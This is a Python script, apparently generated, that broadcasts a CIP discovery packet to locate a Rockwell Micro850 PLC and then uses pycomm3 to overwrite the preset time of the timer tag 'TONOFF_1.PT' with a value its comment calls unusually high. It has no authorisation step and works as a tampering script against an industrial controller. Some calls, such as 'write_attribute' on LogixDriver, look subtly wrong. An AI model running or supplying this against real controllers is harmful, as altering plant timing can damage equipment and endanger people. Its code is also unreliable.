import pycomm3
import time
import socket

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address on the local network.
    This is a basic attempt and may not work in all network configurations.
    More robust discovery methods might be necessary in complex networks.
    """
    try:
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)  # Timeout after 5 seconds

        # Broadcast a discovery message (Rockwell's CIP discovery)
        # The message below is a simplified version; a full CIP request is complex
        message = b'\x63\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x04\x00\x01\x00\xf4\x05'
        sock.sendto(message, ('<broadcast>', 44818))  #CIP port

        # Listen for responses
        data, addr = sock.recvfrom(1024)
        print(f"Received discovery response from: {addr}")
        return addr[0]  # Return the IP address

    except socket.timeout:
        print("PLC IP address discovery timed out.  Ensure PLC is on the same network segment and broadcasting CIP responses.")
        return None  # or raise an exception

    except Exception as e:
        print(f"Error during PLC IP discovery: {e}")
        return None

    finally:
        sock.close()

def modify_tonoff_timer_parameter(plc_ip, tag_name, new_time_ms):
    """
    Modifies the TONOFF timer preset time (PT) in the PLC.

    Args:
        plc_ip (str): The IP address of the Rockwell Micro850 PLC.
        tag_name (str): The name of the TONOFF timer tag (e.g., 'TONOFF_1.PT').
        new_time_ms (int): The new preset time in milliseconds.
    """
    try:
        with pycomm3.LogixDriver(plc_ip) as plc:
            # Construct the time string
            time_string = f"T#{new_time_ms}ms"
            print(f"Writing value {time_string} to tag: {tag_name}")
            status = plc.write_attribute(tag_name, time_string)

            if status[0]:
                print(f"Successfully modified {tag_name} to {time_string}")
            else:
                print(f"Failed to modify {tag_name}.  Error: {status}")

    except Exception as e:
        print(f"An error occurred: {e}")


def main():
    plc_ip = find_plc_ip()

    if plc_ip is None:
        print("Could not determine PLC IP address.  Exiting.")
        return

    print(f"Using PLC IP address: {plc_ip}")

    tonoff_tag = 'TONOFF_1.PT'  # Tag for the TONOFF timer preset time (ON time)
    # Example: Increase the ON time to an unusually high value
    new_on_time_ms = 60000  # 60 seconds

    try:
        modify_tonoff_timer_parameter(plc_ip, tonoff_tag, new_on_time_ms)
        print("Modification attempt completed.")
    except Exception as e:
        print(f"An error occurred during the process: {e}")


if __name__ == "__main__":
    main()